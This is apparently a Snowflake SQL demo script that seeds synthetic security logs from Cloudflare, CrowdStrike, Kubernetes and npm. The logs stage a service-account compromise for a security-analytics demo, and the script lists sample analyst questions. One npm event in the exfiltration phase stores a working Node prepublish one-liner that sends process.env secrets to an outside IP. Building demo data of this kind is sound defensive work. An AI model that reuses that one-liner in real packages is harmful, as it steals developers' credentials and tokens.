-- ============================================================================
-- DEMO INJECTION: SERVICE ACCOUNT PASSWORD COMPROMISED
-- ============================================================================
-- Run this script DURING or BEFORE a demo to inject a fresh, timestamped
-- service account compromise incident. This script ADDS data - it does NOT
-- delete or replace existing events.
--
-- INCIDENT TIMELINE (relative to CURRENT_TIMESTAMP):
--   -2 hours: Credential stuffing attempts against svc_deploy account
--   -1 hour:  Successful login (password compromised)
--   -45 min:  Lateral movement - unusual API calls
--   -30 min:  Privilege escalation attempts in Kubernetes
--   -15 min:  Data exfiltration attempt detected
--   NOW:      Alert triggered
--
-- SERVICE ACCOUNT: svc_deploy
-- ATTACKER IP: 45.227.255.206 (known bad actor)
-- ============================================================================

USE ROLE cortex_role;
USE SNOWFLAKE_INTELLIGENCE.TOOLS;

-- ============================================================================
-- PHASE 1: CREDENTIAL STUFFING (Cloudflare) - 2 hours ago
-- Attacker tries multiple passwords against svc_deploy
-- ============================================================================
INSERT INTO SNOWFLAKE_INTELLIGENCE.TOOLS.CLOUDFLARE_LOGS_SYNTH
SELECT
  DATEADD('second', seq4() * 2, DATEADD('hour', -2, CURRENT_TIMESTAMP())) AS event_time,
  '45.227.255.206' AS client_ip,  -- Attacker IP
  'api.company.com' AS client_request_host,
  'POST' AS client_request_method,
  '/api/v1/auth/service-account' AS client_request_uri,
  IFF(seq4() < 45, 401, 200)::NUMBER(38,0) AS edge_response_status,  -- Last few succeed
  500::NUMBER(38,0) AS edge_response_bytes,
  'ru' AS client_country,
  48666::NUMBER(38,0) AS client_asn,
  'EWR' AS edge_colo_code,
  MD5_HEX('svc-compromise-' || seq4()::STRING) AS ray_id,
  IFF(seq4() < 40, 'challenge', IFF(seq4() < 45, 'allow', 'allow')) AS security_action,
  IFF(seq4() < 40, '1', '0') AS waf_flags,
  TO_JSON(OBJECT_CONSTRUCT(
    'ClientIP', '45.227.255.206',
    'ClientRequestHost', 'api.company.com',
    'ClientRequestURI', '/api/v1/auth/service-account',
    'EdgeResponseStatus', IFF(seq4() < 45, 401, 200),
    'Username', 'svc_deploy',
    'AuthAttempt', seq4() + 1,
    'SecurityAction', IFF(seq4() < 40, 'challenge', 'allow'),
    'ThreatScore', IFF(seq4() < 40, 85, 60),
    'IncidentType', 'service_account_credential_stuffing'
  )) AS raw_event
FROM TABLE(GENERATOR(ROWCOUNT => 50));

-- ============================================================================
-- PHASE 2: SUCCESSFUL COMPROMISE (Cloudflare + CrowdStrike) - 1 hour ago
-- Attacker successfully authenticates as svc_deploy
-- ============================================================================
INSERT INTO SNOWFLAKE_INTELLIGENCE.TOOLS.CLOUDFLARE_LOGS_SYNTH
SELECT
  DATEADD('minute', seq4(), DATEADD('hour', -1, CURRENT_TIMESTAMP())) AS event_time,
  '45.227.255.206' AS client_ip,
  'api.company.com' AS client_request_host,
  IFF(seq4() % 3 = 0, 'GET', IFF(seq4() % 3 = 1, 'POST', 'PUT')) AS client_request_method,
  IFF(seq4() % 5 = 0, '/api/v1/secrets', 
      IFF(seq4() % 5 = 1, '/api/v1/deployments',
      IFF(seq4() % 5 = 2, '/api/v1/users',
      IFF(seq4() % 5 = 3, '/api/v1/config', '/api/v1/admin')))) AS client_request_uri,
  200::NUMBER(38,0) AS edge_response_status,
  (1000 + seq4() * 100)::NUMBER(38,0) AS edge_response_bytes,
  'ru' AS client_country,
  48666::NUMBER(38,0) AS client_asn,
  'EWR' AS edge_colo_code,
  MD5_HEX('svc-lateral-' || seq4()::STRING) AS ray_id,
  'allow' AS security_action,
  '0' AS waf_flags,
  TO_JSON(OBJECT_CONSTRUCT(
    'ClientIP', '45.227.255.206',
    'AuthenticatedUser', 'svc_deploy',
    'SessionID', 'sess-compromised-' || seq4()::STRING,
    'ClientRequestURI', IFF(seq4() % 5 = 0, '/api/v1/secrets', '/api/v1/deployments'),
    'EdgeResponseStatus', 200,
    'IncidentType', 'compromised_service_account_activity',
    'Suspicious', 'unusual_api_access_pattern'
  )) AS raw_event
FROM TABLE(GENERATOR(ROWCOUNT => 30));

-- CrowdStrike: Suspicious activity from compromised service account
INSERT INTO SNOWFLAKE_INTELLIGENCE.TOOLS.CROWDSTRIKE_FALCONHOST_SYNTH
SELECT
  DATEADD('minute', seq4() * 2, DATEADD('hour', -1, CURRENT_TIMESTAMP())) AS dev_time,
  '45.227.255.206' AS src_ip,
  (50000 + seq4())::NUMBER(38,0) AS src_port,
  '10.1.1.100' AS dst_ip,  -- Internal API server
  443::NUMBER(38,0) AS dst_port,
  'E' AS domain,
  'Suspicious Activity' AS category,
  'svc_deploy' AS username,
  1::NUMBER(38,0) AS conn_dir,
  'TCP' AS proto,
  IFF(seq4() % 4 = 0, 'https://api.company.com/api/v1/secrets',
      IFF(seq4() % 4 = 1, 'https://api.company.com/api/v1/users',
      IFF(seq4() % 4 = 2, 'https://api.company.com/api/v1/config',
          'https://api.company.com/api/v1/admin'))) AS url,
  'Suspicious Activity' AS event_name,
  CONCAT(
    'LEEF:1.0|CrowdStrike|FalconHost|1.0|Suspicious Activity|',
    ' src=45.227.255.206',
    ' dst=10.1.1.100',
    ' usrName=svc_deploy',
    ' cat=Suspicious Activity',
    ' reason=Service account accessing unusual resources',
    ' severity=high',
    ' threatType=compromised_credentials',
    ' incidentID=SVC-DEPLOY-COMPROMISE-001',
    ' sessionID=sess-compromised-', seq4()::STRING
  ) AS raw_event
FROM TABLE(GENERATOR(ROWCOUNT => 25));

-- ============================================================================
-- PHASE 3: KUBERNETES PRIVILEGE ESCALATION - 45 minutes ago
-- Attacker uses svc_deploy to access K8s secrets and deployments
-- ============================================================================
INSERT INTO SNOWFLAKE_INTELLIGENCE.TOOLS.KUBERNETES_AUDIT_LOGS_SYNTH
SELECT
  DATEADD('minute', seq4(), DATEADD('minute', -45, CURRENT_TIMESTAMP())) AS event_time,
  'k8s-master-01.cluster.local' AS hostname,
  'k8s-audit' AS program,
  133::NUMBER(38,0) AS severity,
  '<133> k8s-audit: COMPROMISED SERVICE ACCOUNT - svc_deploy accessing sensitive resources' AS raw_syslog,
  TO_JSON(OBJECT_CONSTRUCT(
    'kind', 'Event',
    'apiVersion', 'audit.k8s.io/v1',
    'level', 'RequestResponse',
    'verb', IFF(seq4() % 4 = 0, 'get', IFF(seq4() % 4 = 1, 'list', IFF(seq4() % 4 = 2, 'create', 'delete'))),
    'objectRef', OBJECT_CONSTRUCT(
      'resource', IFF(seq4() % 5 = 0, 'secrets', IFF(seq4() % 5 = 1, 'configmaps', IFF(seq4() % 5 = 2, 'deployments', IFF(seq4() % 5 = 3, 'serviceaccounts', 'roles')))),
      'namespace', IFF(seq4() % 3 = 0, 'prod', IFF(seq4() % 3 = 1, 'kube-system', 'default')),
      'name', IFF(seq4() % 4 = 0, 'database-credentials', IFF(seq4() % 4 = 1, 'api-keys', IFF(seq4() % 4 = 2, 'admin-token', 'tls-secrets')))
    ),
    'user', OBJECT_CONSTRUCT('username', 'svc_deploy', 'uid', 'compromised-session'),
    'sourceIPs', ARRAY_CONSTRUCT('45.227.255.206'),
    'responseStatus', OBJECT_CONSTRUCT('code', IFF(seq4() % 6 = 0, 403, 200)),
    'annotations', OBJECT_CONSTRUCT(
      'authorization.k8s.io/decision', IFF(seq4() % 6 = 0, 'forbid', 'allow'),
      'suspicious', 'true',
      'reason', 'Service account svc_deploy accessing from unusual external IP'
    )
  )) AS raw_event_json,
  UUID_STRING() AS audit_id,
  'ResponseComplete' AS stage,
  'RequestResponse' AS level,
  IFF(seq4() % 4 = 0, 'get', IFF(seq4() % 4 = 1, 'list', IFF(seq4() % 4 = 2, 'create', 'delete'))) AS verb,
  CONCAT('/api/v1/namespaces/', IFF(seq4() % 3 = 0, 'prod', 'kube-system'), '/', 
         IFF(seq4() % 5 = 0, 'secrets', IFF(seq4() % 5 = 1, 'configmaps', 'deployments'))) AS request_uri,
  'svc_deploy' AS username,
  'compromised-session' AS user_uid,
  '45.227.255.206' AS source_ip,  -- External attacker IP (unusual for service account!)
  'kubectl/v1.28.0 (linux/amd64)' AS user_agent,
  IFF(seq4() % 5 = 0, 'secrets', IFF(seq4() % 5 = 1, 'configmaps', IFF(seq4() % 5 = 2, 'deployments', 'serviceaccounts'))) AS object_resource,
  IFF(seq4() % 3 = 0, 'prod', IFF(seq4() % 3 = 1, 'kube-system', 'default')) AS object_namespace,
  IFF(seq4() % 6 = 0, 403, 200)::NUMBER(38,0) AS response_code,
  IFF(seq4() % 6 = 0, 'forbid', 'allow') AS authz_decision
FROM TABLE(GENERATOR(ROWCOUNT => 20));

-- ============================================================================
-- PHASE 4: DATA EXFILTRATION ATTEMPT - 30 minutes ago
-- Attacker tries to exfiltrate secrets via npm package publish
-- ============================================================================
INSERT INTO SNOWFLAKE_INTELLIGENCE.TOOLS.NPM_PACKAGE_EVENTS_SYNTH
SELECT
  DATEADD('minute', seq4(), DATEADD('minute', -30, CURRENT_TIMESTAMP())) AS event_time,
  'prod' AS environment,
  'prod-app-01' AS hostname,
  'org/api' AS repository,
  'pipe-COMPROMISED-001' AS pipeline_id,
  'svc_deploy' AS actor,  -- Compromised service account
  IFF(seq4() % 3 = 0, 'publish', 'runtime_alert') AS event_type,
  IFF(seq4() % 3 = 0, '@internal/exfil-package', IFF(seq4() % 3 = 1, 'malicious-payload', 'data-stealer')) AS package_name,
  '0.0.1' AS package_version,
  '@internal' AS package_scope,
  'registry.npmjs.org' AS registry,
  'npm publish' AS install_command,
  'prepublish' AS script_name,
  'node -e "require(''https'').request({host:''45.227.255.206'',path:''/exfil?data=''+Buffer.from(JSON.stringify(process.env)).toString(''base64'')})"' AS script_command,
  '45.227.255.206' AS network_dest_host,  -- Exfil to attacker IP
  443::NUMBER(38,0) AS network_dest_port,
  'credential_theft' AS indicator_type,
  'critical' AS indicator_severity,
  'CWE-522' AS cwe_id,
  'Insufficiently Protected Credentials' AS cwe_name,
  IFF(seq4() % 2 = 0, 'detected', 'blocked') AS status,
  TO_JSON(OBJECT_CONSTRUCT(
    'event_time', TO_VARCHAR(DATEADD('minute', seq4(), DATEADD('minute', -30, CURRENT_TIMESTAMP()))),
    'compromised_account', 'svc_deploy',
    'attacker_ip', '45.227.255.206',
    'attack_phase', 'data_exfiltration',
    'indicator', OBJECT_CONSTRUCT(
      'type', 'credential_theft',
      'severity', 'critical',
      'cwe', OBJECT_CONSTRUCT('id', 'CWE-522', 'name', 'Insufficiently Protected Credentials')
    ),
    'incident_id', 'SVC-DEPLOY-COMPROMISE-001',
    'exfil_target', '45.227.255.206',
    'data_types', ARRAY_CONSTRUCT('AWS_ACCESS_KEY_ID', 'DATABASE_URL', 'NPM_TOKEN', 'GITHUB_TOKEN')
  )) AS raw_event_json
FROM TABLE(GENERATOR(ROWCOUNT => 10));

-- ============================================================================
-- PHASE 5: DETECTION ALERT (CrowdStrike) - 15 minutes ago
-- EDR detects the compromised account behavior
-- ============================================================================
INSERT INTO SNOWFLAKE_INTELLIGENCE.TOOLS.CROWDSTRIKE_FALCONHOST_SYNTH
SELECT
  DATEADD('minute', seq4(), DATEADD('minute', -15, CURRENT_TIMESTAMP())) AS dev_time,
  '45.227.255.206' AS src_ip,
  (60000 + seq4())::NUMBER(38,0) AS src_port,
  IFF(seq4() % 2 = 0, '10.1.1.100', '10.1.2.50') AS dst_ip,
  443::NUMBER(38,0) AS dst_port,
  'E' AS domain,
  'Suspicious Activity' AS category,
  'svc_deploy' AS username,
  1::NUMBER(38,0) AS conn_dir,
  'TCP' AS proto,
  'https://45.227.255.206/exfil' AS url,
  'Suspicious Activity' AS event_name,
  CONCAT(
    'LEEF:1.0|CrowdStrike|FalconHost|1.0|Suspicious Activity|',
    ' alertType=COMPROMISED_SERVICE_ACCOUNT',
    ' src=45.227.255.206',
    ' usrName=svc_deploy',
    ' cat=Suspicious Activity',
    ' reason=Service account credential compromise detected - unusual external access pattern',
    ' severity=critical',
    ' threatType=account_takeover',
    ' incidentID=SVC-DEPLOY-COMPROMISE-001',
    ' killChainPhase=exfiltration',
    ' recommendation=Rotate svc_deploy credentials immediately'
  ) AS raw_event
FROM TABLE(GENERATOR(ROWCOUNT => 5));

-- ============================================================================
-- SUMMARY: What to ask during the demo
-- ============================================================================
-- 
-- DEMO QUESTIONS:
-- 1. "Show me all events for user 'svc_deploy' in the last 2 hours"
-- 2. "Which IPs did svc_deploy authenticate from?"
-- 3. "Show me Cloudflare events from IP 45.227.255.206"
-- 4. "Were there failed login attempts before the successful compromise?"
-- 5. "What Kubernetes resources did svc_deploy access?"
-- 6. "Were there any data exfiltration attempts by svc_deploy?"
-- 7. "Show me the timeline of the svc_deploy compromise"
-- 8. "What CrowdStrike alerts were triggered for svc_deploy?"
--
-- INCIDENT SUMMARY:
-- - Service Account: svc_deploy
-- - Attacker IP: 45.227.255.206
-- - Attack Timeline: -2h to -15min
-- - Phases: Credential stuffing → Successful auth → Lateral movement → K8s secrets → Exfil attempt
-- - CWE: CWE-522 (Insufficiently Protected Credentials)
-- ============================================================================

SELECT 'SERVICE ACCOUNT COMPROMISE INCIDENT INJECTED' AS status,
       'svc_deploy' AS compromised_account,
       '45.227.255.206' AS attacker_ip,
       DATEADD('hour', -2, CURRENT_TIMESTAMP()) AS incident_start,
       CURRENT_TIMESTAMP() AS incident_detected,
       'SVC-DEPLOY-COMPROMISE-001' AS incident_id;


